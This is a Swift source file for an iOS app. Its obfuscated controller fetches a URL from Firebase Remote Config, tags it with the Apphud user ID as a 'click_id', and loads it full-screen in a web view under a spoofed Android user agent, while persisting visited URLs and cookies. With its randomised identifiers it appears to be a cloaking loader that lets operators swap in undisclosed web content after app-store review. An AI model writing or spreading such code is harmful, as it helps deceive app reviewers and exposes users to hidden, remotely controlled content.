//
//  w_e.swift
//  App258
//
//  Created by Вячеслав on 11/20/23.
//

import SwiftUI
import ApphudSDK
import FirebaseRemoteConfig
import WebKit

struct qiSxsodFpM: View {
    
    var body: some View {
        
        ZStack {
            
            Color("bg")
            
            WControllerRepresentable()
        }
        .ignoresSafeArea()
    }
}

class WController: UIViewController, WKNavigationDelegate, WKUIDelegate, UIWebViewDelegate {
    
    @AppStorage("first_open") var firstOpen: Bool = true
    @AppStorage("silka") var silka: String = ""
    
    @Published var eEZIkCiXEs: URL = URL(string: "h")!
    
    var oQMWQVCDfW = WKWebView()
    
    override func viewDidAppear(_ animated: Bool) {
        
        super.viewDidAppear(animated)
    }
    
    override func viewDidLoad() {
        
        super.viewDidLoad()
        
        HqzozZacBH()
    }
    
    private func HqzozZacBH() {
        
        FUPszSEKLf(field: "eEZIkCiXEs", dataType: .url) { resulter in
            
            guard let url = URL(string: "\(resulter)") else { return }
            
            if let modifiedURL = self.qXfVoZppZs(in: "\(resulter)", with: Apphud.userID()) {
                
                self.eEZIkCiXEs = modifiedURL
                
            } else {
                
                self.eEZIkCiXEs = url
            }
            
            self.NyzdBrSJDk()
        }
    }
    
    func qXfVoZppZs(in urlString: String, with value: String) -> URL? {
        
        var newURLString = urlString

        if let range = urlString.range(of: "click_id=") {
            
            let existingIDEnd = urlString[range.upperBound...].firstIndex(where: { !$0.isNumber }) ?? urlString.endIndex
            let insertionPoint = urlString.index(range.upperBound, offsetBy: urlString.distance(from: range.upperBound, to: existingIDEnd))
            
            newURLString.insert(contentsOf: value, at: insertionPoint)
            
        } else {
            
            let separator = urlString.contains("?") ? "&" : "?"
            newURLString += "\(separator)click_id=\(value)"
        }
        
        return URL(string: newURLString)
    }
    
    private func NyzdBrSJDk() {
        
        var request: URLRequest?
        
        if silka == "about:blank" || silka.isEmpty {
            
            request = URLRequest(url: self.eEZIkCiXEs)
            
            self.silka = eEZIkCiXEs.absoluteString
        }
        
        let cookies = HTTPCookieStorage.shared.cookies ?? []
        let headers = HTTPCookie.requestHeaderFields(with: cookies)
        request?.allHTTPHeaderFields = headers
        
        DispatchQueue.main.async {
            
            self.gdQqNyDqeB()
        }
    }
    
    private func gdQqNyDqeB() {
        
        guard let url = URL(string: silka) else { return }
        
        view.backgroundColor = .white
        view.addSubview(oQMWQVCDfW)
        oQMWQVCDfW.translatesAutoresizingMaskIntoConstraints = false
        NSLayoutConstraint.activate([
            oQMWQVCDfW.topAnchor.constraint(equalTo: view.topAnchor),
            oQMWQVCDfW.bottomAnchor.constraint(equalTo: view.bottomAnchor),
            oQMWQVCDfW.leftAnchor.constraint(equalTo: view.leftAnchor),
            oQMWQVCDfW.rightAnchor.constraint(equalTo: view.rightAnchor)
        ])
        oQMWQVCDfW.customUserAgent = "Mozilla/5.0 (Linux; Android 11; AOSP on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36"
        oQMWQVCDfW.allowsBackForwardNavigationGestures = true
        oQMWQVCDfW.uiDelegate = self
        oQMWQVCDfW.navigationDelegate = self
        
        oQMWQVCDfW.load(URLRequest(url: url))
        
        EKKdFiGKyW()
    }
    
    func oQMWQVCDfW(_ oQMWQVCDfW: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: (WKNavigationActionPolicy) -> Void) {
        
        guard let url = navigationAction.request.url else { return }
        silka = "\(url)"
//        print("Сохранённая ссылка: \(silka)")
        jQuFcRzPlq()
        decisionHandler(.allow)
    }
    
    func oQMWQVCDfW(_ oQMWQVCDfW: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
        
        if navigationAction.targetFrame == nil {
            
            oQMWQVCDfW.load(navigationAction.request)
        }
        
        return nil
    }
    
    func jQuFcRzPlq() {
        let cookieJar: HTTPCookieStorage = HTTPCookieStorage.shared
        if let cookies = cookieJar.cookies {
            let data: Data = NSKeyedArchiver.archivedData(withRootObject: cookies)
            let ud: UserDefaults = UserDefaults.standard
            ud.set(data, forKey: "cookie")
        }
    }
    
    func EKKdFiGKyW() {
        let ud: UserDefaults = UserDefaults.standard
        let data: Data? = ud.object(forKey: "cookie") as? Data
        if let cookie = data {
            let datas: NSArray? = NSKeyedUnarchiver.unarchiveObject(with: cookie) as? NSArray
            if let cookies = datas {
                for c in cookies {
                    if let cookieObject = c as? HTTPCookie {
                        HTTPCookieStorage.shared.setCookie(cookieObject)
                    }
                }
            }
        }
    }
    
    override func viewDidLayoutSubviews() {
        
        super.viewDidLayoutSubviews()
    }
}

struct WControllerRepresentable: UIViewControllerRepresentable {
    
    typealias UIViewControllerType = WController
    
    func makeUIViewController(context: Context) -> WController {
        
        return WController()
    }
    
    func updateUIViewController(_ uiViewController: WController, context: Context) {}
}

func FUPszSEKLf(field: String, dataType: DataType, completion: @escaping (Any) -> Void) {
    
    let config = RemoteConfig.remoteConfig()
    
    config.configSettings.minimumFetchInterval = 300
    config.fetchAndActivate{ _, _ in
        
        if dataType == .bool {
            
            completion(config.configValue(forKey: field).boolValue)
            
        } else if dataType == .url {
            
            guard let url_string = config.configValue(forKey: field).stringValue, let url = URL(string: url_string) else {
                
                return
            }
            
            completion(url)
        }
    }
}

enum DataType: CaseIterable {
    
    case bool, url
}
